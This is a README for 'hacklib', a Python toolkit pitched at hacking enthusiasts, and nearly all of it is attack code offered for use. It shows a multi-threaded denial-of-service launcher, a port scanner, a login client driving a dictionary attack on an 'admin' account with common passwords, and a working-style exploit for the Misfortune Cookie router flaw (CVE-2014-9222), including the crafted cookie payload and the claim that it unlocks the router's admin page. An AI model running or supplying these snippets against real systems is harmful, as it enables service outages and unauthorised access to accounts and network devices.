# hacklib
![MIT License](https://img.shields.io/github/license/mashape/apistatus.svg)
[![Python 2.6|2.7](https://img.shields.io/badge/python-2.6|2.7-yellow.svg)](https://www.python.org/)
##### Toolkit for hacking enthusiasts using Python.
hacklib is a Python module for hacking enthusiasts. It is currently in its barebones stages.

#### Examples of Usage
-
Multi-threaded Denial of Service (DOS) Stress-Testing:
```python
import hacklib

dos = hacklib.DOSer()
dos.launch('http://yourwebsite.com', duration=30, threads=50)
```
-
Port Scanning:
```python
from hacklib import *

ps = PortScanner()
ps.scan(getIP('yourwebsite.com'))
# By default scans the first 1024 ports with 1 second timeout. Use ps.scan(IP, port_range=n, timeout=i) to change default

# After a scan, open ports are saved within ps for reference
if ps.portOpen(80):
    # Establish a TCP stream and sends a message
    send(getIP('yourwebsite.com'), 80, message='GET HTTP/1.1 \r\n')
```
-
Universal Login for almost all HTTP/HTTPS form-based logins and HTTP Basic Authentication logins:

```python
import hacklib

ac = hacklib.AuthClient()
# AuthClient uses the mechanize module for form-based logins

# Attempts to login and return the HTML of the resulting page
htmldata = ac.login('http://yourwebsite.com/login', 'username', 'password')

# For form-based logins, returns HTML whether login works or not.
# Returns False if resulting page has the same URL as the login page
if htmldata and 'try again' not in htmldata.lower():
    print 'Login Success'

# Returns False if login fails using HTTP Basic Authentication
if htmldata:
    print 'Login Success'
```
Simple Dictionary Attack using AuthClient:
```python
import hacklib

ac = hacklib.AuthClient()
# Get the top 100 most common passwords
passwords = hacklib.topPasswords(100)

for p in passwords:
    htmldata = ac.login('http://yourwebsite.com/login', 'admin', p)
    if htmldata and 'welcome' in htmldata.lower():
        print 'Password is', p
        break
    # For HTTP Basic Authentication logins, simply use 'if htmldata:'
```
-
Misfortune Cookie Exploit:
```python
# CVE-2014-9222
>>> import hacklib

# Discovery
>>> ps = hacklib.PortScanner()
>>> ps.scan('192.168.1.1', 81)
Port 80:
HTTP/1.1 404 Not Found
Content-Type: text/html
Transfer-Encoding: chunked
Server: RomPager/4.07 UPnP/1.0
EXT:
# The banner for port 80 shows us that the server uses RomPager/4.07. This is exploitable.

# Exploitation
>>> payload = '''GET /HTTP/1.1
Host: 192.168.1.1
User-Agent: googlebot
Accept: text/html, application/xhtml+xml, application/xml; q=09, */*; q=0.8
Accept-Language: en-US, en; q=0.5
Accept-Encoding: gzip, deflate
Cookie: C107351277=BBBBBBBBBBBBBBBBBBBB\x00''' + '\r\n\r\n'
>>> hacklib.send('192.168.1.1', 80, payload)
# The cookie replaced the firmware's Assembly code for web authentication with a null bye.
# The router's admin page is now fully accessible.
```
